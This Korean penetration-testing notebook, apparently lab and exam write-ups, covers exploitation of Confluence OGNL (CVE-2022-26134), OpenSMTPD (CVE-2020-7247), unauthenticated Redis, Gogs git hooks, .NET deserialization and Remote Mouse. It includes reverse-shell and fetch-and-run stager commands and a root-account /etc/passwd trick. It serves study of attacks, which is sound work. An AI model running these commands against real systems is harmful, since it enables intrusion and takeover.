**①이 막혀 있어도 ③이 열려 있으면 끝남.** 「임의 쓰기가 되는데 웹루트에 못 쓴다」로 접기 전에, 그 시스템이 **어떤 파일을 명령으로 읽는지** 목록을 만들 것.

**③ 유형 표적 목록:**

| 표적 | 발화 조건 | 실행 주체 |
|---|---|---|
| **애플리케이션 스케줄러 설정**(`scheduler.yaml`·`config/schedule.php`) | 앱의 크론 러너가 읽을 때 | 앱 실행 계정 ← [[Astronaut]] |
| `/etc/cron.d/*` · `/var/spool/cron/crontabs/<user>` | 매분 크론이 스캔 | **root**(`/etc/cron.d` 면) |
| `/etc/systemd/system/*.service` | 서비스 재시작·부팅 | **root** |
| `~/.ssh/authorized_keys` | 다음 SSH 로그인 | 해당 사용자 |
| `~/.bashrc` · `~/.profile` · `/etc/profile.d/*.sh` | 다음 로그인 셸 | 해당 사용자 |
| `/etc/passwd`(쓰기 가능 시) | 즉시(`su` 로 전환) | 새로 만든 uid 0 계정 |
| `.git/hooks/*` · CI 설정(`.gitlab-ci.yml`) | 다음 push·파이프라인 | 러너 계정 |
| PHP `auto_prepend_file`(`.user.ini`) | 다음 PHP 요청 | 웹 계정 |

⛔ **표적을 고르는 기준은 「쓸 수 있는가」가 아니라 «누가 실행하는가»임.** `~/.bashrc` 에 쓸 수 있어도 그 계정으로 아무도 로그인하지 않으면 영원히 안 돎.

⛔ **덮어쓰기 원시(primitive)면 «반드시 먼저 읽을 것».** `/etc/passwd` 에 UID 0 줄을 추가할 때 새 줄만 올리면 **기존 계정이 전부 사라져 부팅·로그인 불능**이 됨 — 읽기 원시가 함께 없으면 이 표적을 고르지 말 것. 심을 줄의 형식은 `이름:<crypt 해시>:0:0:root:/root:/bin/bash` 이고 해시 만드는 법은 B-3-17. [[Twiggy]] 는 `--read` 로 원본을 먼저 받아 줄을 덧붙인 뒤 `--upload-*` 로 되올리는 순서를 밟았음([[Access]]·[[Flu]]·[[Clue]] 도 같은 표적).
→ **쓰기 가능 × 실행 주체의 권한 × 발화 빈도** — 이 셋의 «곱»이 가장 큰 표적을 고를 것. [[Astronaut]] 에서 `scheduler.yaml` 이 정답인 이유는 **발화 빈도가 60초**이기 때문임. 실행 주체는 `www-data`(root 가 아님)지만 **확실하게 도는 쪽이 우선**임.

**flat-file CMS 는 이 부류의 상습범임** — DB 가 없어 콘텐츠도 설정도 전부 파일이고 설정 YAML 이 곧 실행 정의임. 「설정 쓰기 = RCE」가 성립하는 구조.
관련 — 무인증 Redis 의 `cron.d`·`authorized_keys` 경로는 A-2-10 · B-25, 읽기 쪽은 B-1-27, 발화 대기는 B-31.

#### B-1-49. 경로 패턴이 웹서버 종류를 말해준다 — `/goform/` 은 임베디드 C 핸들러다

| 경로 패턴 | 서버 | 함의 |
|---|---|---|
| `/goform/<name>` | GoAhead WebServer | C 함수 핸들러. **메모리 손상 후보**(B-9) |
| `/cgi-bin/<name>.cgi` | 범용 CGI | Shellshock · 명령 주입 후보 |
| `/HNAP1/` | D-Link 등 | 인증 우회 계열 CVE 다수 |
| `/boaform/` | Boa WebServer | GoAhead 와 같은 임베디드 계열 |
| `.asp` + `GoAhead-Webs` 헤더 | GoAhead 의 자체 ASP 구현 | **Microsoft IIS ASP 가 아님.** IIS 취약점을 찾으면 헛수고 |

**GoAhead 는 동적 처리를 CGI 가 아니라 서버 프로세스 «안»의 C 함수로 직접 함**(`websFormDefine("formExportDataLogs", handler)` → `POST /goform/formExportDataLogs` 가 그 함수로 직행). 보안 함의가 넷임:

| 특성 | 결과 |
|---|---|
| 핸들러가 서버 프로세스 내부에서 돎 | 별도 CGI 프로세스가 없음 → **오버플로우 하나가 웹 서버 전체의 프로세스 권한**을 줌 |
| 순수 C, 스크립트 언어 아님 | `strcpy`·`sprintf` 계열 메모리 손상이 곧바로 코드 실행 |
| 임베디드 지향이라 스택 버퍼가 작음 | 셸코드를 담을 공간이 없음 → **에그헌터가 필요해짐**(B-92) |
| `/goform/<이름>` 경로가 곧 함수 이름 | 핸들러 이름이 그대로 공격 표면 목록 |

⚠️ **확장자에 속지 말 것.** [[Kevin]] 의 nmap 이 `Requested resource was http://TARGET/index.asp` 를 뱉었으나 IIS 가 아니었음 — **`Server: GoAhead-Webs` 헤더가 진짜 근거**임(A-11 「배너를 받은 쪽이 이김」과 같은 선).

#### B-1-50. Atlassian Confluence CVE-2022-26134 — URI 경로 OGNL 주입 (미인증 RCE)

**탐지 신호** — 8090/8091(기본 포트) · `http-title: Log In - Confluence` · `Requested resource was /login.action?...` (`.action` = WebWork/Struts2 매핑) · 로그인 페이지 **푸터에 버전이 박혀 있음**(무인증으로 읽힘).

**영향 버전** — 1.3.0–7.4.17 · 7.13.0–7.13.7 · 7.14.0–7.14.3 · 7.15.0–7.15.2 · 7.16.0–7.16.4 · 7.17.0–7.17.4 · 7.18.0–7.18.1.

**메커니즘** — URI 경로 세그먼트가 액션 네임스페이스로 파싱되며 검증 없이 OGNL 평가 컨텍스트로 흘러듦. **라우팅이 인증 필터보다 앞이라 미인증.** 로그인 화면밖에 못 보는 상태에서 그대로 터짐 — `permissionViolation=true` 리다이렉트는 방어가 아니라 **아직 도달하지 않은 단계**임.
```text
GET /${OGNL 표현식}/  HTTP/1.1
      └─ 경로 세그먼트 → 액션 네임스페이스 파싱 → OGNL 평가 → Class.forName(...) 임의 호출
```

**PoC** — `https://github.com/jbaines-r7/through_the_wire`(Rapid7). 시험 규정상 **허용**(특정 CVE 하나를 겨냥한 공개 PoC 는 스스로 취약점을 발견하지 않음).
```text
python through_the_wire.py --rhost <타겟> --rport 8090 --lhost <tun0> --protocol http:// --read-file /etc/passwd
python through_the_wire.py --rhost <타겟> --rport 8090 --lhost <tun0> --protocol http:// --reverse-shell
```
⚠️ **`--rport` 와 `--protocol` 은 둘 다 필수임** — 기본값이 `443` · `https://` 라 안 주면 열려 있지도 않은 포트로 던지고 `[-] The HTTP request failed` 만 뱉음(A-14).
⚠️ **`--fork-nc` 는 끌 수 없음**(`action="store_true"` + `default=True`). 항상 `nc -lvnp 1270` 을 포크하므로 리스너를 미리 띄우면 충돌함(A-31).

**먼저 `--read-file` 로 RCE 를 증명하고 그다음 셸을 던질 것** — 셸이 안 붙었을 때 원인이 「익스플로잇 실패」인지 「아웃바운드 차단」인지 분리됨. 단 이 프리미티브는 **파일을 HTTP 로 안 돌려주고** 타겟이 별도 TCP 를 열어 밀어 넣으며, **`readAllBytes()` 가 `Socket()` 보다 먼저**라 권한이 없으면 리스너에 **아무것도 안 옴**(A-12).

**손으로 할 때** — 위 OGNL 문자열을 URL 인코딩해 `curl --path-as-is` 로 경로에 붙임. **닫는 `/` 필수.**
⚠️ **과잉 인코딩이 오히려 실패를 부름.** `urllib.parse.quote()` 의 `safe` 기본값이 `'/'` 라 **슬래시는 인코딩되지 않음** — `quote(p, safe='')` 나 `--data-urlencode` 로 슬래시까지 인코딩하면 원본 PoC 와 다른 요청이 됨. `[가정]` 동작 원리는 Confluence 가 이 구간을 세그먼트가 아니라 **문자열 단위로** 평가에 넘기기 때문으로 보이나 요청·응답을 직접 확인하지는 못했음.

**얻는 권한은 `confluence` 서비스 계정임.** RCE 를 얻었다고 root 가 아님 — 셸을 잡으면 곧장 로컬 열거로 갈 것(A-41).
**셸을 잡으면 `/var/atlassian/application-data/confluence/confluence.cfg.xml` 에 DB 비밀번호가 평문으로 있음**(설치 디렉터리가 아니라 **홈** 디렉터리임 — 경로를 외우지 말고 `find / -name confluence.cfg.xml`). `cwd_user` 테이블의 `{PKCS5S2}` 는 PBKDF2-HMAC-SHA1(10000 라운드)이고, **깨도 나오는 것은 웹 UI admin 비밀번호이지 OS 계정이 아님** — 이미 OS 셸을 쥔 뒤라면 방향 착오임.
**8091 은 `synchrony.core`**(협업 편집 백엔드, Clojure/Aleph). 같은 `confluence` 계정으로 도므로 **권한상승 경로가 아님.**

**출처** — [[Flu]]

#### B-1-51. BinaryFormatter 계열 역직렬화가 왜 RCE 인가

**역직렬화는 「데이터를 읽는 행위」가 아니라 「코드를 실행하는 행위」임.** 객체를 복원하려면 런타임이 반드시 ①바이트열에 적힌 **타입 이름**을 읽고 ②그 타입을 어셈블리에서 로드하고 ③인스턴스를 만들어 필드를 채우고 ④**복원 완료 콜백을 호출**해야 함(`OnDeserialization()`·`ISerializable` 생성자·`IDeserializationCallback`, 자바라면 `readObject`/`readResolve`).
**④가 전부임** — 타입 이름을 공격자가 정한다는 것은 「어떤 클래스의 복원 콜백을 실행시킬지 공격자가 고른다」는 뜻임.

**가젯 체인** — 「역직렬화 도중 자동으로 실행되는, 이미 애플리케이션에 존재하는 코드 조각」을 이어 붙인 것. ROP 의 가젯과 개념이 같아 **새 코드를 주입하는 것이 아니라 있는 코드를 엮음.** 그래서 셸코드도, 메모리 손상도, ASLR/DEP 우회도 필요 없고 순수하게 타입 시스템을 남용함. 체인이 표준 라이브러리(`mscorlib`·`System`)에만 있어도 성립하므로 **애플리케이션이 무엇이든 재사용됨** — `ysoserial.net`(닷넷)·`ysoserial`(자바)·`phpggc`(PHP)가 존재하는 이유임.

**위험도는 「타입 이름을 스트림에서 읽는가」로 갈림:**

| 직렬화기 | 타입을 어디서 정하는가 | 위험도 |
|---|---|---|
| `XmlSerializer` | 호출자가 미리 지정(`new XmlSerializer(typeof(Foo))`) | 낮음 |
| `DataContractSerializer` | 호출자 지정 + `KnownTypes` 화이트리스트 | 낮음 |
| `JavaScriptSerializer`(기본) | 호출자 지정 | 낮음 |
| `BinaryFormatter` | **스트림 안에 적힌 대로** | 치명적 |
| `NetDataContractSerializer` · `LosFormatter` · `ObjectStateFormatter` | **스트림 안에 적힌 대로** | 치명적 |

`BinaryFormatter.Deserialize()` 에 신뢰할 수 없는 바이트를 넣는 것 = **그 바이트를 실행하는 것**과 동등. 예외 없음.

Microsoft 는 이 클래스를 .NET 9 에서 제거했고 그 전에도 「안전하게 만들 수 없다」고 공식 문서에 못박음.

**`TypeConfuseDelegate` 체인이 도는 순서** — [[Algernon]] EDB 49216 이 쓰는 체인. base64 를 디코드하면 타입 이름이 평문으로 보임:
```text
System.Collections.Generic.SortedSet`1[[System.String, mscorlib, ...]]
System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, ...]]
System.DelegateSerializationHolder
System.DelegateSerializationHolder+DelegateEntry
System.Reflection.MemberInfoSerializationHolder
System.Func`3[[System.String, ...],[System.String, ...],[System.Diagnostics.Process, System, ...]]
System.Diagnostics.Process
Start
System.Comparison`1[[System.String, mscorlib, ...]]
Compare
```

| 단계 | 무슨 일이 일어나는가 |
|---|---|
| 1 | `SortedSet<string>` 이 복원됨. `OnDeserialization` 에서 원소를 다시 트리에 삽입하며 정렬함 |
| 2 | 삽입하려면 비교자를 호출해야 함. 비교자는 스트림이 정한 `ComparisonComparer<string>` — `Comparison<string>` 델리게이트를 감싼 래퍼 |
| 3 | 그 델리게이트는 `DelegateSerializationHolder` 로 복원됨 |
| 4 | `DelegateSerializationHolder` 는 「델리게이트 타입 + 대상 메서드」를 받아 리플렉션으로 델리게이트를 재구성함. 여기서 시그니처 검증이 느슨함 |
| 5 | 스트림은 델리게이트 타입을 `Comparison<string>`(= `int (string, string)`)이라 선언해 놓고 실제 바인딩 메서드로는 `Process.Start(string, string)` 를 지정 |
| 6 | 둘은 반환형이 다름(`int` vs `Process`). 그런데 x64 에서 둘 다 레지스터 하나로 반환되므로 호출 규약이 호환됨 → **타입 혼동(type confusion)** |
| 7 | 1단계의 트리 삽입이 비교자를 호출 → 실제로는 `Process.Start("cmd", "/c powershell.exe -encodedCommand ...")` 가 실행됨 |

**`DelegateSerializationHolder` 가 하는 일** — 델리게이트(함수 포인터)는 메모리 주소라 그대로 직렬화될 수 없음. 그래서 .NET 은 「어느 타입의 어느 메서드인가」라는 메타데이터로 바꿔 담고 복원할 때 리플렉션으로 다시 묶음. 즉 **「문자열로 적힌 메서드 이름을 실제 호출 가능한 함수로 바꿔주는 공장」**이고, 공격자가 그 문자열을 정하면 `mscorlib`/`System` 안의 아무 정적 메서드나 호출할 수 있게 됨. `MemberInfoSerializationHolder` 는 그 하위 부품으로 `System.Diagnostics.Process Start(System.String, System.String)` 라는 **시그니처 문자열로 메서드를 찾아줌** — 페이로드에 이 문자열이 두 번(`Signature`·`Signature2`) 들어 있는 이유임.

**인자 순서** — 디코드한 페이로드의 배열 원소 두 개:
```text
ArraySingleObject id=4, length=2
  ├─ [0] BinaryObjectString id=6 : "/c powershell.exe -encodedCommand XXXX...(1360)"
  └─ [1] BinaryObjectString id=7 : "cmd"
```
원소 두 개짜리 트리를 재구성할 때 먼저 들어간 것이 루트가 되고 두 번째 삽입에서 `Compare(신규, 기존)` 이 호출됨 `[가정]`. 그러면 `Process.Start("cmd", "/c powershell.exe ...")` 가 되어 파일명이 `cmd`, 인자가 `/c ...` 로 올바르게 맞음. **실제로 셸이 떨어졌으므로 결과는 확정이나, 위 호출 순서 설명 자체는 코드 계측으로 확인하지 않았으므로 `[가정]` 으로 둠.**

**역직렬화 취약점을 만났을 때 확인할 것 넷**
1. **어떤 직렬화기인가** — `BinaryFormatter`·`ObjectStateFormatter`·`LosFormatter`·`NetDataContractSerializer` 면 즉시 RCE 후보
2. **가젯이 실행되는 트리거** — `OnDeserialization`·`ISerializable` 생성자·`IDeserializationCallback`, 자바면 `readObject`/`readResolve`
3. **전달 경로** — 쿠키·ViewState·HTTP 본문, 그리고 원시 TCP(.NET Remoting)
4. **자바 등가물** — `CommonsCollections1~7`·`Spring1`·`Jdk7u21`. `ysoserial`(자바)/`ysoserial.net`(닷넷)은 개념이 같고 이름만 다름

**출처** — [[Algernon]](`TypeConfuseDelegate`, CVE-2019-7214).

#### B-1-52. 문자열로 함수를 고르는 디스패처는 「막는 목록」인지 「통과시키는 목록」인지 본다

**점검 질문 하나** — 「호출 가능한 이름이 allowlist 로 제한돼 있는가, denylist 이거나 아예 없는가?」 **「막을 것을 세는 코드」를 보면 의심하고 「통과시킬 것을 세는 코드」를 찾을 것.**

[[Twiggy]] SaltStack CVE-2020-11651 — `_handle_clear()` 가 `cmd.startswith('__')`(밑줄 **두** 개)만 거부하는 **거부 목록**으로 `getattr(clear_funcs, cmd)` 를 호출함. 내부 헬퍼 `_prep_auth_info` 는 밑줄이 **하나**라 그대로 통과하고, 인자 없이 부르면 **마스터 root key 를 그대로 리턴**함. 패치는 `expose_methods`(6개) **허용 목록** + `get_method()` 로 교체한 것임.

**같은 구조의 다른 언어 표현:**
```text
PHP     call_user_func($_GET['fn'], ...)
Python  getattr(handler, request['action'])
Java    router.getDeclaredMethod(name)           ← 리플렉션 라우터
Ruby    send(params[:method])                    ← Rails
```

⚠️ **검증 함수가 코드베이스에 «있다»는 것과 위험 지점에서 «불린다»는 것은 다름.** 같은 박스의 CVE-2020-11652(경로 트래버설)의 `clean_path()` 는 **취약 버전에도 이미 존재**했으나 `file_roots.py` 가 호출하지 않았음 — 패치는 새 함수를 만든 것이 아니라 **호출을 추가**한 것뿐임.
→ **소스를 읽을 때 「방어 코드가 있는가」가 아니라 「sink 직전에 «실제로» 불리는가」를 볼 것.** 함수 정의만 보고 안전하다고 판단하면 취약점을 통째로 놓침.

### B-2. 네트워크 서비스

#### B-21. ProFTPd + mod_sql_mysql — 계정이 DB 행 하나다

**탐지 신호** — FTP(21)가 떠 있고 셸에서 `sql.conf` 에 `SQLConnectInfo`·`SQLUserInfo` 가 보임. 인증을 파일이 아니라 **MySQL 테이블**에서 함.

**인증 DB 에 쓸 수 있으면 임의 uid/homedir 로 FTP 계정을 만들 수 있음.** FTP 세션이 **그 uid 권한으로** 돌아, 소유자만 쓰던 홈에 파일을 심는 우회가 됨.
```sql
INSERT INTO ftpuser (userid, passwd, uid, gid, homedir, shell) VALUES (...);
```
[[Fractal]] 에서 www-data → benoit 피벗이 정확히 이것이었음(`~/.ssh/authorized_keys` 를 심어 SSH 로 승격).

⚠️ **DB 를 혼동하지 말 것** — `parameters.yml` 의 자격증명은 **앱 DB(`symfony`)** 이고, 계정 위조에 필요한 것은 **별개의 `proftpd` DB**(`sql.conf`, 출처 `frag/enum1.html`)였음. 저장소 이원화(A-22)의 사례.

**일반 패턴** — 「**인증 저장소에 쓰기 = 계정 위조**」. ProFTPd 말고도 인증을 DB 로 외부화한 서비스 전부에 적용됨.

**출처** — [[Fractal]].

#### B-22. Gogs / Gitea — Git Hooks 는 «설계된» RCE 다

**탐지 신호** — 8000·3000 에 `Golang net/http` + `http-title: Gogs`(또는 Gitea).

**로그인되면 곧바로 저장소 Settings → Git Hooks 를 볼 것. 관리자면 RCE 확정** — admin 은 서버에서 임의 셸 스크립트를 **커밋 시점에** 실행시킬 수 있음. **push 없이 웹 에디터 커밋만으로 발화함.**

**절차**([[Assignment]] 실측, curl 3회)
1. 저장소 생성 — ⚠️ 소유자 필드는 `uid` 가 아니라 **`user_id`**(Gogs 0.12.9). 200 = 실패, 302 = 성공(A-12)
2. `post-receive` 훅에 리버스셸 등록
3. 웹 에디터로 파일 커밋 → 훅 실행

⚠️ **`app.ini` 의 `ENABLE_GIT_HOOKS = false` 를 믿지 말 것** — [[Assignment]] 에서 값이 `false` 였는데 **그대로 동작했음.** 0.12.9 소스에 **그 키 자체가 없고** 게이트는 `u.IsAdmin || u.AllowGitHook` 뿐임(A-45 에 소스 위치).

**출처** — [[Assignment]](Gogs 0.12.9).

#### B-23. OpenSMTPD MAIL FROM 로컬파트 검증 우회 — CVE-2020-7247

**탐지 신호** — 25/tcp 가 `OpenSMTPD` 로만 뜨고 버전이 안 나옴. ⚠️ HELP 응답의 `2.0.0` 은 **ENHANCEDSTATUSCODES 상태코드지 버전이 아니다.** 버전 미상이어도 blind PoC 로 바로 때려볼 것.

**메커니즘** — `smtp_mailaddr()` 이 로컬파트 검증(`valid_localpart()`) 실패에도 **도메인이 비어 있으면** 통과시킴. `MAIL FROM:<;CMD;>`(`@도메인` 없음)로 검증을 우회하면 그 문자열이 로컬 배달(mda) 명령줄에 그대로 삽입돼 실행됨. 배달 프로세스가 root 면 곧장 root RCE. 영향범위는 2018-05 커밋 `a8e222352f` 이후 ~ **6.6.2p1 미만**.

**문자 제약 — 삭제가 아니라 «치환»이다.** `MAILADDR_ESCAPE`(`! # $ % & ' * ? ` { | } ~` + CR/LF)에 든 문자는 지워지지 않고 콜론(`:`) 한 글자로 바뀜.

- `curl LHOST/x|sh` → `curl LHOST/x:sh` (파이프 소실, URL 하나짜리 명령이 됨)
- `$(id)` → `:(id)` → 셸이 `(` 에서 문법 오류로 죽음
- 요청 로그에 `GET /x:sh` 처럼 남으면 **삭제가 아니라 치환이라는 증거**
- ⚠️ **「필터링(삭제)」로 알고 있으면 그 404 를 「curl 이 타겟에 없나?」로 오독함.** [[Bratarina]] 에서 실제로 그렇게 돼 `CURLTEST`/`WGETTEST` 프로브에 시간을 씀 — `12:57:13`(치환된 요청 도착) → `12:58:37`(`-o` 우회로 fetch 성공)까지 **84초**(`http_stager.log`)
- `smtp_mailaddr()` 은 첫 `>` 에서 주소를 끊고, 그 다음 첫 `:` 앞을 통째로 버림 — `>` 를 쓰면 뒤가 날아가 `bash -i >& ...` 를 인라인으로 못 넣고, `:` 를 쓰면 앞이 날아가 `http://` 스킴을 못 붙임(스킴 없는 URL 로 우회)

**우회 — 2단계 페이로드.** 인젝션에는 통과 문자(영숫자·`;`·공백·`-`·`.`·`/`)만 쓰는 짧은 fetch 명령을 넣고, 파이프·치환이 필요한 진짜 로직은 받아올 스크립트 파일 안에 둘 것: `curl LHOST/x -o /tmp/x; sh /tmp/x`.

**수동 대안(msf 1대 제한 대비)** — exploit-db 47984(순수 python). 더 원시적으로는 `nc`/`telnet` 으로 `HELO x` → `MAIL FROM:<;CMD;>` → `RCPT TO:<root>` → `DATA` → `.` 순서를 손으로 쳐도 됨.

**아웃바운드 fetch 자체가 필요 없는 대안** — msf 모듈(`48038.rb`) 원안(Qualys). 주소에 `;for a in <15개 토큰>;do read;done;sh;exit 0;` 만 넣어(전부 통과 문자) 서버가 앞에 붙인 메일 헤더를 `read` 로 흘려보내고, 그 다음 `sh` 가 DATA 본문의 나머지를 표준입력으로 읽어 실행 — **본문에는 문자 제약이 없어** 리버스셸 한 줄을 그대로 삽입 가능. **주소로 못 넣을 페이로드는 본문으로 넣을 것.**

**형제 카드** — [[ClamAV]] 의 clamav-milter `RCPT TO` 주입(B-2-11). 필드만 다르고 **주소 필드에 셸 메타문자를 넣는다 → 문자 제약을 먼저 계측한다**가 같음.

— 출처: [[Bratarina]]

#### B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다

BOF·커널 RCE 처럼 메모리를 깨는 익스플로잇은 성공/크래시가 확률적. **성공하면 그 세션에서 목표(플래그)를 즉시 끝낼 것** — 재시도는 공짜가 아니라 대상 드라이버를 죽여 스스로 공격면을 닫음.

[[Internal]] CVE-2009-3103(MS09-050, `srv2.sys`) 실측 — 첫 성공 셸에서 플래그를 안 읽고 재시도하다 SMBv2(`smb-protocols` 의 `2.0.2` dialect)가 사라짐. `srv.sys`(SMBv1)는 안 죽어 SMB 응답 자체는 살아 있어 **「복구됐다」고 오판하기 쉬움** — SMBv2 생사는 `--script smb2-capabilities` 로 따로 물어야 함(죽었을 때 `SMB 2+ not supported`, 살아있을 때 `2.0.2: Distributed File System`).

**revert 검증** — 「revert 했다」는 주장은 타겟 TCP 옵션의 timestamp(`TS val`, 부팅 시 리셋되는 단조증가 카운터)로 검산 가능. 두 시점 샘플이 선형이면 재부팅이 없었던 것. [[Internal]]: `TS val` 6113@00:56:05 → 284901@01:42:33, Δt=2788초 ΔTS=278788 → 정확히 **100.0 tick/s** = 재부팅 없음, revert 미반영 판정.

**발사 «전»에 소스를 읽으면 발사 자체가 불필요해지는 경우가 많음.** [[Sorcerer]] — nmap 의 `OS details: Linux 5.0 - 5.14`(오탐, A-1)를 근거로 CVE-2021-22555(netfilter `xt_compat_target_from_user`)를 골라 `gcc -m32 -static` 로 컴파일까지 했음(2분, 782,560B). 그런데 **소스 첫머리가 이미 답을 갖고 있었음:**
```c
/* Exploit tested on Ubuntu 5.8.0-48-generic and COS 5.4.89+. */
#define KERNEL_UBUNTU_5_8_0_48 1
```
하드코딩된 ROP 가젯 오프셋이 **두 특정 커널 빌드 전용**이라 실제 커널(Debian 10 = 4.19 계열)에서는 성공이 아니라 **커널 패닉이 정상 결과**임. 추가 전제조건도 있었음(`ip_tables` 모듈 로드 · 유저 네임스페이스 생성 권한). 15분 뒤 SUID `start-stop-daemon` 으로 root 를 잡아 실제로는 쓰지 않았음.
→ **익스플로잇 소스의 `#define` 과 "Tested on" 주석을 컴파일 «전»에 읽을 것**(A-14). 같은 선례 — [[Jacko]] 의 익스플로잇 헤더 `Tested on: … H2 1.4.199`.
→ **커널 익스플로잇은 열거를 «전부» 끝낸 뒤 마지막에 봄** — `sudo -l`·SUID·cron·capabilities·쓰기 가능 서비스 파일·프로세스 목록이 먼저임(A-41 · A-4-12). [[Sorcerer]] 의 정답은 `find / -perm -4000` 한 줄이었고, **컴파일에 쓴 시간이 그 한 줄보다 100배 길었음.**
→ 커널을 고를 때의 근거는 **`uname -a` 뿐임.** nmap 의 OS 추측은 근거가 못 됨.

**예외 — 실패 시 자동 BSOD→재부팅하는 구성이면 재시도가 정상 워크플로가 됨.** [[Internal]] 이 인스턴스는 실패 발사마다 BSOD→자동 재부팅(~90초)→`srv2.sys` 재생을 반복. 「SMBv2 가 광고될 때까지 대기 → 한 발 → 콜백 없으면 재부팅 대기 → 재시도」 루프(`attempt_loop.sh`)로 매번 1~2 시도 안에 셸 확보. return address·magic index 가 **그 부팅의 메모리 배치**와 맞아야 셸이 뜨고 아니면 크래시 — 성공/실패가 부팅마다 확정적이지 않음.

#### B-25. 무인증 Redis = 임의 파일 쓰기 = RCE

**신호** — `6379/tcp open redis`. 반사적으로 이 경로를 떠올릴 것.

**첫 4개 명령이 익스플로잇 가능 여부를 그 자리에서 판정함:**
```bash
redis-cli -h <타겟> INFO server        # 버전 · executable 경로 (A-2-10 ⓒ 판정)
redis-cli -h <타겟> MODULE LIST        # 응답하면 MODULE 이 rename 안 됨
redis-cli -h <타겟> CONFIG GET dir     # 응답하면 CONFIG 가 rename 안 됨
redis-cli -h <타겟> INFO replication   # role:master 면 SLAVEOF 가능
```

**메커니즘 — 세 이야기를 분리해서 볼 것.**

① **복제가 임의 파일 쓰기다.** 슬레이브가 `SLAVEOF <master> <port>` 로 붙으면, 최초 동기화(full resync)에서 마스터가 데이터셋 전체를 RDB 스냅샷 하나로 직렬화해 보내고, 슬레이브는 받은 바이트를 **자신의 `dir`/`dbfilename` 경로에 파일로 기록**한 뒤 로드함. 가짜 마스터(rogue master)를 세우면 그 바이트를 우리가 정함:
```text
victim>  SLAVEOF <우리IP> <포트>            # 타겟을 우리 rogue master 의 슬레이브로
victim>  CONFIG SET dbfilename exp.so       # 받은 RDB 를 exp.so 라는 이름으로
victim>  CONFIG SET dir /some/writable/path # 어느 디렉터리에
```
RDB 앞뒤에 헤더/푸터 바이트가 붙어 결과 파일은 **RDB 껍데기로 감싼 `.so`** 이지만, ELF 로더는 파일 선두의 ELF 매직만 보므로 모듈로는 정상 동작함. **같은 헤더/푸터가 cron.d 경로는 죽임**(A-2-10 ⓐ).

② **`MODULE LOAD` 는 설계상 RCE 다.** Redis 4.0+ 의 모듈 API 가 `.so` 를 `dlopen` 하고 `RedisModule_OnLoad` 를 호출함. `n0b0dyCN/redis-rogue-server` 의 `exp.so` 는 `system.exec`(`popen`)·`system.rev`(리버스셸) 두 커맨드를 등록함.

③ **권한은 «모듈»이 아니라 «Redis 구동 계정»에서 옴.** `popen` 이 만드는 `/bin/sh` 는 redis-server 의 자식이라 부모 uid 를 상속함. Redis 가 root 면 즉시 root, `redis` 계정이면 그때부터 표준 리눅스 권한상승 열거가 시작됨. **「모듈 로드 = root RCE」는 오독임.**

**변형 — 원리는 같고 막히는 지점만 다름:**
- Redis 가 **저권한 계정**으로 구동 → foothold 후 별도 권한상승 필요. `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.d` · 커널 익스플로잇 순
- `[가정]` 저권한이어도 `config set dir` 로 쓸 수 있는 root 소유 경로(예: root cron 이 처리하는 웹루트)가 있으면 우회 가능
- `authorized_keys` 경로 / cron.d 경로가 막히는 사유는 A-2-10

**방어(`rename-command`)** — `CONFIG` · `MODULE` · `SLAVEOF` 셋 중 하나만 지워도 이 경로 전체가 닫힘.

**출처** — [[Wombo]](Redis 5.0.9 소스 컴파일본, `system.exec` → uid=0).

#### B-26. Remote Mouse 계열 원격제어 앱 — 키입력 주입으로 RCE (CVE-2022-3365 · EDB 46697)

**신호** — nmap 이 `remotemouse`·`Emote Remote Mouse` 를 찍음. 또는 **1978~1980 대역**이 열려 있음. Remote Mouse·Mobile Mouse·WiFi Mouse·Mini Mouse 계열은 전부 같은 부류(EDB 46697·51010·49601·49743 등).

**원리** — 폰 앱이 PC 를 조종하는 도구. 설정에서 `Password for Connection` 을 비워 두면 기본 암호로 동작하고, 제어 프로토콜이 자명한 치환 암호로 평문 전송됨 → **누구나 키·마우스 이벤트를 주입할 수 있음.** 프로토콜에 `run` 명령은 없지만, **주입된 키가 콘솔 세션의 «현재 사용자» 컨텍스트로 들어가므로** 시작 메뉴에 명령을 타이핑하는 것이 곧 OS 명령 실행.

**전제** — 콘솔에 로그인된 사용자가 있어야 함. [[Mice]] 는 `AutoAdminLogon REG_SZ 1` / `DefaultUserName REG_SZ divine` 이라 성립.

**프로토콜** — 배너·핸드셰이크는 **TCP** 1978(`SIN 15win nop nop 300`), 이벤트는 **UDP** 1978. ⚠️ UDP 상위 100 스캔으로는 못 찾음(1978 은 애초에 상위 100 에 없음). **열거는 TCP 로, 공격은 UDP 로** 하는 서비스가 있다는 예. 키코드는 자체 인코딩(`key  7[ras]84` = 소문자 `a`, `key  3RTN` = Enter, `mos  5m 1 0` = 1픽셀 이동, `mos  5R l d`/`l u` = 좌클릭 다운/업)이고 PoC 가 문자→키코드 표를 통째로 담고 있어 임의 문자열을 타이핑할 수 있음.

**절차** — 절대 좌표를 모르므로 마우스를 화면 밖으로 충분히 밀어(`move(-5000, 3000)`) 좌하단 시작 버튼에 붙이고 클릭 → 검색창에 스테이저 타이핑 → Enter.
```bash
python3 mice_type.py "powershell -nop -w hidden iex(irm http://<LHOST>/a)"
```
`-nop` 은 프로필 로딩을 건너뛰어 시작을 빠르게 함(**문자당 0.4초라 명령이 길수록 그대로 손해**), `-w hidden` 은 PowerShell 창이 화면에 뜨는 것을 막음 — **화면이 그대로 노출되는 GUI 주입에서는 실용적인 차이**. ⚠️ 다만 스테이저가 조용하면 이 플래그가 아니라 **서버의 페이로드**를 갈아야 함(A-35).

**CVE 대응** — 이 결함은 **CVE-2022-3365**, PoC 는 **EDB 46697**(2019, CVE 배정보다 앞섬). msf `exploit/windows/misc/remote_mouse_rce` 의 References 가 둘을 나란히 달고 있어 대응이 확정됨. ⚠️ **CVE-2021-43326 으로 적기 쉬운데 그 번호는 Automox Agent** 취약점임(A-13).

**같은 앱이 권한상승도 줌** — B-45(CVE-2021-35448).

#### B-27. 익명으로 열리는 SMB 공유 — `path` 가 웹루트인지부터 본다

**널 세션(`-N`)으로 읽히는 공유를 만나면 그 공유가 웹 서버 문서 루트와 같은 디렉터리인지 먼저 확인할 것.** 같으면 `wp-config.php`·`configuration.php`·`.env` 같은 설정파일이 **그대로 자격증명 덤프**가 됨.

**결정적 대조** — `robots.txt` 의 disallow 항목과 공유 디렉터리 목록이 **1:1 로 맞으면** 그 공유가 웹루트임.

[[LazySysAdmin]] 실측 절차:
```bash
